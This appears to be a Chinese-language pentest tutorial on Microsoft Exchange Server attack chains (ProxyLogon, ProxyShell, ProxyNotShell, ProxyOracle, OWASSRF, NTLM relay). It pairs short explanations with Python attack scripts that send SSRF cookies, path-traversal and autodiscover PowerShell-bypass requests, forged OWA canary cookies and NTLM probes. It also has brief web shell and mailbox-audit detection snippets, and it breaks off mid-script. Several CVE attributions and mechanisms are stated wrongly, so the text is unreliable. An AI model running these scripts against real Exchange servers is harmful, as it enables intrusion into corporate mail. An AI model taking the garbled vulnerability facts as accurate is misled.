---
title: "Microsoft Exchange Server ProxyLogon ProxyShell ProxyNotShell CVE漏洞链利用技术"
date: 2025-07-02T00:00:00+08:00
draft: false
weight: 123
description: "深入分析 Microsoft Exchange Server 的 ProxyLogon（CVE-2021-26855/26857/26858/27065）、ProxyShell（CVE-2021-34473/34523/31207）、ProxyNotShell（CVE-2022-41040/41082）、ProxyOracle（CVE-2021-31195/31196）、OWASSRF（CVE-2022-41080）、NTLM Relay（CVE-2023-21529/2024-21410）等完整攻击面，覆盖 2020-2025 年高危 CVE 漏洞链、后利用技术及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["Microsoft","Exchange Server","ProxyLogon","ProxyShell","ProxyNotShell","ProxyOracle","OWASSRF","CVE-2021-26855","CVE-2021-34473","CVE-2022-41040","CVE-2023-21529","CVE-2024-21410","SSRF","RCE","NTLM Relay","邮件服务器"]
---

## 0x00 攻击面总览

Microsoft Exchange Server 是全球企业最核心的邮件与协作平台，深度集成 Active Directory、OWA（Outlook Web App）、ECP（Exchange Control Panel）、EWS（Exchange Web Services）、ActiveSync、MAPI-over-HTTP 等多种协议和服务。从 2021 年到 2024 年，Exchange Server 连续爆发多组"Proxy"系列高危漏洞链，每一组都能从外网未授权直达 RCE 或邮箱数据窃取，被 HAFNIUM、Lapsus$、LockBit 等国家级 APT 和勒索组织大规模利用：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| OWA / ECP 前端代理 | 443 | **严重** | ProxyLogon SSRF + 反序列化 RCE，HAFNIUM 大规模利用 |
| Autodiscover / UM | 443 | **严重** | ProxyShell SSRF + 令牌伪造 + UM RCE 链 |
| Autodiscover / PowerShell | 443 | **严重** | ProxyNotShell SSRF + URL Rewrite 绕过 + PowerShell RCE |
| OWA / ECP 认证 | 443 | **高危** | ProxyOracle Cookie 伪造，绕过双因素认证 |
| OWA / EWS / MAPI | 443 | **高危** | OWASSRF 认证 SSRF，可触发 NTLM 泄露 |
| 邮件协议 (SMTP/IMAP/POP) | 25/143/995 | **高危** | NTLM Relay 认证中继，域权限提升 |
| Exchange Admin Center | 443 | **严重** | 管理面接管，RBAC 绕过 |
| PowerShell Remoting | 5985/5986 | **严重** | Exchange Management Shell 滥用 |
| AD 集成 (LDAP/Kerberos) | 389/636/88 | **严重** | Exchange 组权限滥用，域级持久化 |

Exchange Server 的安全问题极其危险——它同时承载企业全部邮件通信、AD 高权限服务账号、以及多个面向互联网的 Web 端点，一旦被攻破，攻击者可直接读取全员邮箱、伪造邮件、横向移动至域控。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 443,25,587,993,995,143,110,5985,5986 <target>

curl -skI https://<target>/owa/
# X-OWA-Version: 15.1.2507.16
# X-FEServer: EXCH-SERVER
# Set-Cookie: ClientId=...

curl -skI https://<target>/ecp/
# X-OWA-Version / X-FEServer

curl -sk https://<target>/autodiscover/autodiscover.xml
# Exchange Autodiscover 响应

curl -sk https://<target>/ews/exchange.asmx
# Exchange Web Services WSDL
```

### 1.2 关键路径与端口映射

```
443    — OWA / ECP / EWS / ActiveSync / MAPI / Autodiscover / OAB
25     — SMTP (接收)
587    — SMTP (提交)
993    — IMAPS
995    — POP3S
143    — IMAP
110    — POP3
5985   — WinRM HTTP (PowerShell Remoting)
5986   — WinRM HTTPS (PowerShell Remoting)
88     — Kerberos
389    — LDAP
636    — LDAPS
```

### 1.3 关键 URL 路径

```
/owa/                                    — Outlook Web App 登录
/ecp/                                    — Exchange Control Panel
/ews/exchange.asmx                       — Exchange Web Services
/autodiscover/autodiscover.xml           — Autodiscover 服务
/autodiscover/autodiscover.json          — Autodiscover JSON API
/Microsoft-Server-ActiveSync             — ActiveSync
/mapi/                                   — MAPI-over-HTTP
/rpc/                                    — RPC-over-HTTP
/OAB/                                    — Offline Address Book
/powershell/                             — Exchange Remote PowerShell
/RpcWithCert/                            — RPC with Client Certificate
/exchweb/                                — Exchange Web 根目录
/aspnet_client/                          — ASP.NET 客户端资源
```

### 1.4 版本探测

```python
import requests
import re
import urllib3
urllib3.disable_warnings()

def detect_exchange(host, port=443):
    base_url = f"https://{host}:{port}"
    endpoints = [
        "/owa/",
        "/ecp/",
        "/ews/exchange.asmx",
        "/autodiscover/autodiscover.xml",
        "/Microsoft-Server-ActiveSync",
        "/mapi/",
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    print(f"[*] Scanning Exchange Server at {base_url}")

    for ep in endpoints:
        try:
            resp = requests.get(
                f"{base_url}{ep}",
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            if resp.status_code in [200, 302, 401, 403]:
                print(f"[+] {ep} -> HTTP {resp.status_code}")
                for hdr in ["X-OWA-Version", "X-FEServer", "X-AspNet-Version", "Server"]:
                    val = resp.headers.get(hdr, "")
                    if val:
                        print(f"    {hdr}: {val}")

                ver = re.search(r'X-OWA-Version:\s*([\d.]+)', str(resp.headers))
                if ver:
                    owa_ver = ver.group(1)
                    print(f"\n[+] Exchange Version: {owa_ver}")
                    major = int(owa_ver.split(".")[0])
                    if major == 15:
                        print("[+] Product: Exchange Server 2016 / 2019")
                    elif major == 14:
                        print("[+] Product: Exchange Server 2010")
        except Exception:
            pass

    try:
        resp = requests.post(
            f"{base_url}/autodiscover/autodiscover.xml",
            headers={**headers, "Content-Type": "text/xml"},
            data='<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>test@target.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>',
            verify=False,
            timeout=10
        )
        if resp.status_code == 200:
            server_name = re.search(r'<Server>([^<]+)</Server>', resp.text)
            if server_name:
                print(f"[+] Internal server name: {server_name.group(1)}")
    except Exception:
        pass

detect_exchange("192.168.1.1")
```

## 0x02 ProxyLogon — CVE-2021-26855 / 26857 / 26858 / 27065

### 2.1 漏洞原理

**CVSS**: 9.8（严重）| **CISA KEV**: 2021-03 纳入

**影响版本**: Exchange Server 2013 CU23, Exchange Server 2016 CU8-CU19, Exchange Server 2019 CU1-CU8

**漏洞原理**: ProxyLogon 是一条由四个 CVE 组成的漏洞链，核心入口为 CVE-2021-26855（SSRF）。Exchange Server 的 Client Access Service (CAS) 前端代理在处理 OWA/ECP 请求时，会将带有特定 S-1-5-18（SYSTEM SID）的 `X-AnonResource-Backend` Cookie 或 `X-BESource` Header 的请求直接转发到后端 Exchange Backend Service，不进行任何认证验证。攻击者可利用此 SSRF 绕过认证，直接访问后端服务。

**CVE-2021-26855 (SSRF)**: CAS 前端代理在验证请求来源时存在缺陷。当请求携带特定格式的 Cookie 或 Header 时，CAS 认为该请求来自内部系统进程，直接将其转发到后端 Information Store 或 EWS 端点，完全跳过认证。

**CVE-2021-26857 (反序列化 RCE)**: Exchange Backend 的 Unified Content Filter (UCF) 组件在处理通过 SSRF 传入的序列化数据时，使用 .NET BinaryFormatter 进行反序列化，未对输入类型进行验证。攻击者可构造恶意的反序列化 payload，在 SYSTEM 权限下执行任意代码。

**CVE-2021-26858 (文件写入)**: Exchange 的 OAB（Offline Address Book）生成模块存在路径穿越漏洞，攻击者可通过 SSRF 触发的 EWS 请求将文件写入任意位置。

**CVE-2021-27065 (文件写入)**: Exchange ECP 的 DLT 日志功能存在路径穿越，攻击者可通过 SSRF 写入 Web Shell 到 IIS 可访问目录。

**影响**: 2021 年 3 月，微软披露 HAFNIUM 国家级 APT 组织正在积极利用此漏洞链攻击本地 Exchange Server。全球超过 30,000 个组织受到影响，包括政府机构、医疗机构、关键基础设施。这是 2021 年最具影响力的网络安全事件之一。

### 2.2 PoC — SSRF 探测

```python
import requests
import re
import urllib3
urllib3.disable_warnings()

def exploit_proxylogon_ssrf(host, port=443, target_email="admin@target.local"):
    base_url = f"https://{host}:{port}"

    ssrf_paths = [
        "/owa/auth/temp.js",
        "/ecp/temp.js",
        "/owa/auth/current/css/boot.css",
        "/ecp/proxylogon.js",
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cookie": "X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    print("[*] CVE-2021-26855 — ProxyLogon SSRF Probe")
    print(f"[*] Target: {base_url}")

    for path in ssrf_paths:
        try:
            resp = requests.get(
                f"{base_url}{path}",
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            print(f"[*] GET {path} -> HTTP {resp.status_code} ({len(resp.text)} bytes)")
            if resp.status_code == 200 and "ecp" in resp.text.lower():
                print(f"[+] SSRF successful — backend content returned!")
                print(f"[+] Response: {resp.text[:300]}")
        except Exception:
            pass

    ecp_paths = [
        "/ecp/Administrator",
        "/ecp/Administrator/",
    ]

    for path in ecp_paths:
        try:
            resp = requests.get(
                f"{base_url}{path}",
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            if resp.status_code == 200:
                print(f"[+] ECP access via SSRF: {path}")
                if "runspace" in resp.text.lower() or "exchange" in resp.text.lower():
                    print(f"[+] Exchange backend content detected!")
        except Exception:
            pass

    print("[*] Testing Autodiscover SSRF vector...")
    autodiscover_payload = f"""<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
  <Request>
    <EMailAddress>{target_email}</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</Autodiscover>"""

    try:
        resp = requests.post(
            f"{base_url}/autodiscover/autodiscover.xml",
            headers={**headers, "Content-Type": "text/xml"},
            data=autodiscover_payload,
            verify=False,
            timeout=10
        )
        if resp.status_code == 200 and "Protocol" in resp.text:
            print(f"[+] Autodiscover responded with user data!")
            server = re.search(r'<Server>([^<]+)</Server>', resp.text)
            if server:
                print(f"[+] Internal server: {server.group(1)}")
    except Exception:
        pass

exploit_proxylogon_ssrf("192.168.1.1")
```

### 2.3 PoC — 反序列化 RCE 探测

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_proxylogon_deserialize(host, port=443):
    base_url = f"https://{host}:{port}"

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Cookie": "X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/ews/exchange.asmx?~3;",
        "Content-Type": "text/xml; charset=utf-8",
    }

    print("[*] CVE-2021-26857 — ProxyLogon Deserialization RCE Probe")

    ews_payloads = [
        '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"><FolderShape><BaseShape>IdOnly</BaseShape></FolderShape><FolderIds><DistinguishedFolderId Id="inbox"/></FolderIds></GetFolder></soap:Body></soap:Envelope>',
    ]

    for payload in ews_payloads:
        try:
            resp = requests.post(
                f"{base_url}/ecp/temp.js",
                headers=headers,
                data=payload,
                verify=False,
                timeout=15,
                allow_redirects=False
            )
            print(f"[*] EWS via SSRF -> HTTP {resp.status_code} ({len(resp.text)} bytes)")
            if "ResponseCode" in resp.text and "NoError" in resp.text:
                print("[+] EWS access confirmed via ProxyLogon SSRF!")
                print("[+] Target is VULNERABLE to ProxyLogon chain")
            if "mapi" in resp.text.lower():
                print("[+] MAPI backend accessible via SSRF")
        except Exception:
            pass

    print("[*] Testing OAB path traversal (CVE-2021-26858)...")
    oab_headers = {
        "Cookie": "X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/OAB/../../../../../inetpub/wwwroot/aspnet_client/test.txt?~3;",
    }
    try:
        resp = requests.get(
            f"{base_url}/owa/auth/test.txt",
            headers=oab_headers,
            verify=False,
            timeout=10
        )
        print(f"[*] OAB traversal -> HTTP {resp.status_code}")
    except Exception:
        pass

exploit_proxylogon_deserialize("192.168.1.1")
```

### 2.4 Web Shell 检测

```bash
# 检查 Exchange Web 目录中的异常文件
find "/c/Program Files/Microsoft/Exchange Server/V15/FrontEnd/HttpProxy/owa/auth/" \
  -name "*.aspx" -o -name "*.ashx" -o -name "*.asmx" -mtime -180

find "/c/Program Files/Microsoft/Exchange Server/V15/FrontEnd/HttpProxy/ecp/" \
  -name "*.aspx" -o -name "*.ashx" -mtime -180

find "/c/inetpub/wwwroot/aspnet_client/" -type f -mtime -180

# 检查非 Microsoft 签名的 ASPX 文件
Get-ChildItem -Path "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy" \
  -Recurse -Include "*.aspx","*.ashx" | ForEach-Object {
  $sig = Get-AuthenticodeSignature $_.FullName
  if ($sig.SignerCertificate -notlike "*Microsoft*") {
    [PSCustomObject]@{ File = $_.FullName; Signature = $sig.Status }
  }
}
```

## 0x03 ProxyShell — CVE-2021-34473 / 34523 / 31207

### 3.1 漏洞原理

**CVSS**: 9.8（严重）| **CISA KEV**: 2021-08 纳入

**影响版本**: Exchange Server 2013 CU23, Exchange Server 2016 CU19/CU20, Exchange Server 2019 CU8/CU9

**漏洞原理**: ProxyShell 是一条从外网未授权直达 RCE 的三链漏洞组合，由 Orange Tsai（DEVCORE）发现并在 Pwn2Own 2021 中展示。

**CVE-2021-34473 (预认证路径穿越)**: Exchange 前端在处理 `X-Rewrite-URL` Header 时存在路径穿越漏洞。攻击者可通过构造特殊的 URL 路径，绕过前端的路径验证逻辑，将请求重定向到后端受保护的端点（如 `/autodiscover.json`），实现预认证状态下的路径穿越。

**CVE-2021-34523 (权限提升)**: Exchange 后端在处理通过路径穿越传入的请求时，未正确验证请求者的身份权限。当请求通过 Autodiscover 端点传入时，后端将请求者的身份映射为高权限的 `SYSTEM` 或 `Exchange Trusted Subsystem` 组成员，实现权限提升。

**CVE-2021-31207 (逻辑 RCE)**: Exchange Unified Messaging (UM) 服务在处理 .NET 反序列化数据时存在缺陷。攻击者通过 SSRF 将精心构造的序列化数据发送到 UM 的内部端点，触发 .NET BinaryFormatter 反序列化，在 SYSTEM 权限下执行任意代码。

**攻击链**: 路径穿越 → 绕过认证 → Autodiscover SSRF → 权限提升 → UM 反序列化 RCE → Web Shell 部署

### 3.2 PoC — ProxyShell 链探测

```python
import requests
import re
import urllib3
urllib3.disable_warnings()

def exploit_proxyshell_chain(host, port=443):
    base_url = f"https://{host}:{port}"

    print("[*] CVE-2021-34473/34523/31207 — ProxyShell Chain Probe")
    print(f"[*] Target: {base_url}")

    bypass_paths = [
        "/autodiscover.json?@test.com/ews/exchange.asmx",
        "/autodiscover.json?@test.com/powershell",
        "/autodiscover.json?@test.com/mapi/nspi",
        "/owa/auth/temp.js",
        "/ecp/temp.js",
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Rewrite-URL": "/autodiscover/autodiscover.xml",
        "Content-Type": "text/xml",
    }

    autodiscover_body = """<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
  <Request>
    <EMailAddress>admin@target.local</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</Autodiscover>"""

    print("[*] Stage 1: Path traversal via X-Rewrite-URL...")
    for path in bypass_paths:
        try:
            resp = requests.post(
                f"{base_url}{path}",
                headers=headers,
                data=autodiscover_body,
                verify=False,
                timeout=15,
                allow_redirects=False
            )
            print(f"[*] POST {path} -> HTTP {resp.status_code} ({len(resp.text)} bytes)")
            if "Protocol" in resp.text or "Server" in resp.text:
                print(f"[+] Autodiscover data leaked via path traversal!")
            if "ResponseCode" in resp.text:
                print(f"[+] EWS/MAPI backend accessible!")
        except Exception:
            pass

    print("[*] Stage 2: Testing direct Autodiscover SSRF...")
    ssrf_headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "text/xml",
    }
    ssrf_paths = [
        f"/autodiscover.json?@localhost/ews/exchange.asmx",
        f"/autodiscover.json?@localhost/powershell",
        f"/autodiscover.json?@localhost/mapi/nspi",
    ]
    for path in ssrf_paths:
        try:
            resp = requests.post(
                f"{base_url}{path}",
                headers=ssrf_headers,
                data=autodiscover_body,
                verify=False,
                timeout=15
            )
            print(f"[*] SSRF {path} -> HTTP {resp.status_code}")
            if resp.status_code == 200 and len(resp.text) > 100:
                print(f"[+] Backend response received via SSRF")
        except Exception:
            pass

    print("[*] Stage 3: Checking UM endpoint accessibility...")
    um_paths = [
        "/Microsoft-Server-ActiveSync",
        "/ews/exchange.asmx",
        "/mapi/nspi",
    ]
    for path in um_paths:
        try:
            resp = requests.get(
                f"{base_url}{path}",
                headers={"User-Agent": "Mozilla/5.0"},
                verify=False,
                timeout=10
            )
            print(f"[*] {path} -> HTTP {resp.status_code}")
        except Exception:
            pass

exploit_proxyshell_chain("192.168.1.1")
```

### 3.3 邮箱数据导出检测

```powershell
Search-AdminAuditLog -Cmdlets New-MailboxExportRequest, New-MailboxSearch, \
  Search-Mailbox, Get-MailboxPermission |
  Select-Object Caller, CmdletName, ObjectName, RunDate

Get-MailboxPermission -Identity * |
  Where-Object { $_.AccessRights -eq "FullAccess" -and $_.IsInherited -eq $false }

Get-Mailbox -ResultSize Unlimited | ForEach-Object {
  $rules = Get-InboxRule -Mailbox $_.Identity -ErrorAction SilentlyContinue
  foreach ($rule in $rules) {
    if ($rule.ForwardTo -or $rule.RedirectTo -or $rule.DeleteMessage) {
      [PSCustomObject]@{
        Mailbox = $_.UserPrincipalName
        RuleName = $rule.Name
        ForwardTo = $rule.ForwardTo
        RedirectTo = $rule.RedirectTo
      }
    }
  }
}
```

## 0x04 ProxyNotShell — CVE-2022-41040 / 41082

### 4.1 漏洞原理

**CVSS**: 9.8（严重）| **CISA KEV**: 2022-11 纳入

**影响版本**: Exchange Server 2013 CU23, Exchange Server 2016 CU22/CU23, Exchange Server 2019 CU11/CU12

**漏洞原理**: ProxyNotShell 是继 ProxyShell 之后最危险的 Exchange 攻击链，由 DEVCORE 的 Orange Tsai 发现。

**CVE-2022-41040 (SSRF)**: Exchange 前端对经过认证的请求所携带的目标 URL 校验不严。攻击者使用低权限邮箱账户（甚至可以是攻击者自行创建的账户）登录后，可以通过构造特殊请求，让 Exchange 服务器代替自己向内部后端服务发起 HTTP 请求。该 SSRF 可以携带当前用户的认证上下文（Kerberos/NTLM），即"带身份的 SSRF"。

**CVE-2022-41082 (PowerShell RCE)**: Exchange 后端 PowerShell 端点的访问控制存在缺陷。Exchange 通过 IIS 的 URL Rewrite 模块阻止外部直接访问 `/PowerShell`，但该重写规则存在可被绕过的路径模式。攻击者通过 SSRF 向内部 `/PowerShell` 端点发送精心构造的请求，利用 PowerShell 序列化机制触发代码执行。

**路径绕过机制**: 攻击者通过在 URL 中加入特定字符模式（如 `/a]`），可以绕过前端 Rewrite 规则的匹配，同时后端仍能正确解析并路由到 PowerShell 端点。

### 4.2 PoC — ProxyNotShell 链探测

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_proxynotshell(host, port=443, username="test@test.local", password="password"):
    base_url = f"https://{host}:{port}"

    print("[*] CVE-2022-41040/41082 — ProxyNotShell Chain Probe")
    print(f"[*] Target: {base_url}")

    session = requests.Session()
    session.verify = False

    print("[*] Stage 1: Authenticating with low-privilege account...")
    try:
        login_data = {
            "username": username,
            "password": password,
            "isUtf8": "1",
        }
        resp = session.post(
            f"{base_url}/owa/auth.owa",
            data=login_data,
            allow_redirects=False,
            timeout=15
        )
        if "Logon" not in resp.text and resp.status_code in [200, 302]:
            print("[+] Authentication successful")
        else:
            print("[*] Authentication result unclear, continuing...")
    except Exception:
        pass

    print("[*] Stage 2: SSRF to internal PowerShell endpoint...")
    ssrf_paths = [
        "/autodiscover/autodiscover.json?@localhost/powershell",
        "/owa/auth/a]/../../powershell",
        "/ecp/a]/../../powershell",
        "/autodiscover.json?@localhost/PowerShell",
    ]

    for path in ssrf_paths:
        try:
            resp = session.get(
                f"{base_url}{path}",
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=15,
                allow_redirects=False
            )
            print(f"[*] GET {path} -> HTTP {resp.status_code} ({len(resp.text)} bytes)")
            if "powershell" in resp.text.lower() or "serialized" in resp.text.lower():
                print(f"[+] PowerShell endpoint accessible via SSRF!")
        except Exception:
            pass

    print("[*] Stage 3: Testing serialization endpoint...")
    serialize_headers = {
        "Content-Type": "application/soap+xml;charset=UTF-8",
    }
    try:
        resp = session.post(
            f"{base_url}/autodiscover/autodiscover.json?@localhost/powershell",
            headers=serialize_headers,
            data="<root/>",
            timeout=15
        )
        print(f"[*] Serialization probe -> HTTP {resp.status_code}")
        if resp.status_code == 200:
            print("[+] PowerShell serialization endpoint responded!")
    except Exception:
        pass

exploit_proxynotshell("192.168.1.1")
```

## 0x05 ProxyOracle — CVE-2021-31195 / 31196

### 5.1 漏洞原理

**CVSS**: 8.6（高危）

**影响版本**: Exchange Server 2016, Exchange Server 2019（所有受支持的 CU）

**漏洞原理**: ProxyOracle 由两个漏洞组成，允许攻击者绕过 Exchange 的双因素认证（2FA），直接以任意用户身份访问 OWA 邮箱。

**CVE-2021-31195 (认证预言机)**: Exchange OWA 在处理认证请求时，存在一个认证预言机（Authentication Oracle）漏洞。攻击者可通过观察 OWA 对不同认证请求的响应差异（错误消息、重定向行为），逐步推断出有效的加密 Cookie 值。这类似于 TLS 的 POODLE/Padding Oracle 攻击模式。

**CVE-2021-31196 (Cookie 伪造)**: 利用 CVE-2021-31195 获取的信息，攻击者可伪造 Exchange 的 `X-OWA-CANARY` Cookie 和 `X-BackEndCookie`，直接冒充已认证用户访问 OWA，完全绕过双因素认证。

**影响**: 即使目标 Exchange Server 已启用双因素认证（如 RSA SecurID、Azure MFA），攻击者仍可通过此漏洞链绕过 2FA 直接访问邮箱。

### 5.2 PoC — 认证预言机探测

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_proxyoracle_probe(host, port=443):
    base_url = f"https://{host}:{port}"

    print("[*] CVE-2021-31195/31196 — ProxyOracle Auth Bypass Probe")
    print(f"[*] Target: {base_url}")

    owa_endpoints = [
        "/owa/",
        "/owa/auth/logon.aspx",
        "/owa/auth.owa",
    ]

    print("[*] Stage 1: Checking OWA authentication behavior...")
    for ep in owa_endpoints:
        try:
            resp = requests.get(
                f"{base_url}{ep}",
                headers={"User-Agent": "Mozilla/5.0"},
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            print(f"[*] GET {ep} -> HTTP {resp.status_code}")
            cookies = resp.headers.get("Set-Cookie", "")
            if "X-OWA-CANARY" in cookies:
                print(f"[+] X-OWA-CANARY cookie present")
            if "X-BackEndCookie" in cookies:
                print(f"[+] X-BackEndCookie present")
        except Exception:
            pass

    print("[*] Stage 2: Testing authentication oracle responses...")
    test_payloads = [
        {"username": "nonexistent@target.local", "password": "wrong", "isUtf8": "1"},
        {"username": "admin@target.local", "password": "", "isUtf8": "1"},
        {"username": "", "password": "test", "isUtf8": "1"},
    ]

    for payload in test_payloads:
        try:
            resp = requests.post(
                f"{base_url}/owa/auth.owa",
                data=payload,
                headers={"User-Agent": "Mozilla/5.0"},
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            error_msg = ""
            if "error" in resp.text.lower():
                import re
                error_match = re.search(r'class="error[^"]*">([^<]+)<', resp.text)
                if error_match:
                    error_msg = error_match.group(1).strip()
            print(f"[*] Login {payload['username']!r} -> HTTP {resp.status_code} | Error: {error_msg[:60]}")
        except Exception:
            pass

    print("[*] Stage 3: Testing cookie manipulation vectors...")
    canary_values = ["AAAA", "BBBB", "0000", ""]
    for canary in canary_values:
        try:
            resp = requests.get(
                f"{base_url}/owa/",
                headers={
                    "Cookie": f"X-OWA-CANARY={canary}",
                    "User-Agent": "Mozilla/5.0",
                },
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            if resp.status_code == 200 and "logon" not in resp.text.lower():
                print(f"[+] Potential auth bypass with canary={canary}")
        except Exception:
            pass

exploit_proxyoracle_probe("192.168.1.1")
```

## 0x06 OWASSRF — CVE-2022-41080

### 6.1 漏洞原理

**CVSS**: 8.8（高危）

**影响版本**: Exchange Server 2016, Exchange Server 2019（所有受支持的 CU）

**漏洞原理**: OWASSRF（Outlook Web App SSRF）是 ProxyNotShell 漏洞链的前驱发现。攻击者通过已认证的 OWA 会话，可触发服务端请求伪造（SSRF），将请求转发到内部后端服务。该 SSRF 可触发 Exchange 服务器向攻击者控制的端点发起 NTLM 认证请求，从而泄露 Exchange 服务器的机器账户 NTLM 哈希。

**攻击场景**: 认证用户 → OWA SSRF → 内部 EWS/MAPI 端点 → 触发 NTLM 认证外泄 → NTLM Relay 至 LDAP/AD → 域权限提升

**与 ProxyNotShell 的关系**: OWASSRF 和 ProxyNotShell 的 CVE-2022-41040 实际上是同一个 SSRF 漏洞的不同利用角度。OWASSRF 侧重于 NTLM 泄露和权限提升，ProxyNotShell 侧重于 RCE。

### 6.2 PoC — NTLM 泄露探测

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_owassrf(host, port=443, username="user@target.local", password="password"):
    base_url = f"https://{host}:{port}"

    print("[*] CVE-2022-41080 — OWASSRF NTLM Leak Probe")
    print(f"[*] Target: {base_url}")

    session = requests.Session()
    session.verify = False

    print("[*] Stage 1: Authenticating to OWA...")
    try:
        resp = session.post(
            f"{base_url}/owa/auth.owa",
            data={"username": username, "password": password, "isUtf8": "1"},
            allow_redirects=False,
            timeout=15
        )
        print(f"[*] Login -> HTTP {resp.status_code}")
    except Exception:
        pass

    print("[*] Stage 2: Triggering SSRF via OWA endpoints...")
    ssrf_paths = [
        "/owa/auth/temp.js",
        "/ecp/temp.js",
        "/autodiscover/autodiscover.json?@localhost/ews/exchange.asmx",
        "/autodiscover/autodiscover.json?@localhost/powershell",
    ]

    for path in ssrf_paths:
        try:
            resp = session.get(
                f"{base_url}{path}",
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=15,
                allow_redirects=False
            )
            print(f"[*] GET {path} -> HTTP {resp.status_code}")
        except Exception:
            pass

    print("[*] Stage 3: Testing NTLM authentication leak...")
    ntlm_trigger_paths = [
        "/ews/exchange.asmx",
        "/mapi/nspi",
        "/autodiscover/autodiscover.xml",
    ]

    for path in ntlm_trigger_paths:
        try:
            resp = session.get(
                f"{base_url}{path}",
                headers={
                    "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=",
                    "User-Agent": "Mozilla/5.0",
                },
                timeout=10,
                allow_redirects=False
            )
            if resp.status_code == 401:
                ntlm_resp = resp.headers.get("WWW-Authenticate", "")
                if "NTLM" in ntlm_resp:
                    print(f"[+] NTLM challenge at {path}")
                    import base64
                    challenge = ntlm_resp.replace("NTLM ", "")
                    try:
                        decoded = base64.b64decode(challenge)
                        if len(decoded) >= 32:
                            print(f"[+] NTLM challenge received ({len(decoded)} bytes)")
                    except Exception:
                        pass
        except Exception:
            pass

exploit_owassrf("192.168.1.1")
```

## 0x07 NTLM Relay — CVE-2023-21529 / CVE-2024-21410

### 7.1 漏洞原理

**CVE-2023-21529**: CVSS 7.5（高危）| 2023 年 10 月补丁

**CVE-2024-21410**: CVSS 8.4（高危）| 2024 年 2 月补丁 | CISA KEV 纳入

**影响版本**: Exchange Server 2016, Exchange Server 2019（所有受支持的 CU）

**漏洞原理**: 两个漏洞均为预认证 NTLM Relay 漏洞。攻击者可通过向 Exchange Server 的特定端点发送精心构造的请求，强制 Exchange 服务器向攻击者控制的 SMB/LDAP 端点发起 NTLM 认证请求。攻击者可将此 NTLM 认证中继到域控制器（LDAP），实现权限提升甚至域接管。

**CVE-2023-21529**: Exchange 在处理特定格式的邮件协议请求（SMTP/IMAP）时，会触发向外部端点的 NTLM 认证。攻击者无需任何凭据即可触发此行为。

**CVE-2024-21410**: 在 CVE-2023-21529 的补丁之后，Rapid7 研究人员发现补丁未关闭所有 NTLM 泄露路径。Exchange 在处理 Outlook 邮件规则（Mail Rule）中的特定操作时，仍会触发向外部端点的 NTLM 认证。此漏洞被命名为 "NTLM Relay 2: Electric Boogaloo"。

**根本原因**: Exchange 的架构设计中，多个代码路径可触发出站 NTLM 认证，这是一个系统性问题而非单一代码缺陷。

### 7.2 PoC — NTLM Relay 探测

```python
import socket
import struct
import base64
import requests
import urllib3
urllib3.disable_warnings()

def detect_ntlm_relay_vectors(host, port=443):
    base_url = f"https://{host}:{port}"

    print("[*] CVE-2023-21529 / CVE-2024-21410 — NTLM Relay Vector Detection")
    print(f"[*] Target: {base_url}")

    print("[*] Stage 1: Checking SMTP NTLM authentication...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, 25))
        banner = sock.recv(1024).decode(errors="ignore")
        print(f"[+] SMTP Banner: {banner.strip()}")

        sock.send(b"EHLO test.local\r\n")
        ehlo_resp = sock.recv(4096).decode(errors="ignore")
        print(f"[+] EHLO Response: {ehlo_resp.strip()}")

        if "AUTH" in ehlo_resp and "NTLM" in ehlo_resp:
            print("[!] SMTP NTLM authentication enabled — NTLM relay vector!")
            sock.send(b"AUTH NTLM\r\n")
            auth_resp = sock.recv(1024)
            print(f"[+] NTLM challenge: {base64.b64encode(auth_resp).decode()}")
        sock.close()
    except Exception as e:
        print(f"[-] SMTP check failed: {e}")

    print("[*] Stage 2: Checking IMAP NTLM authentication...")
    try:
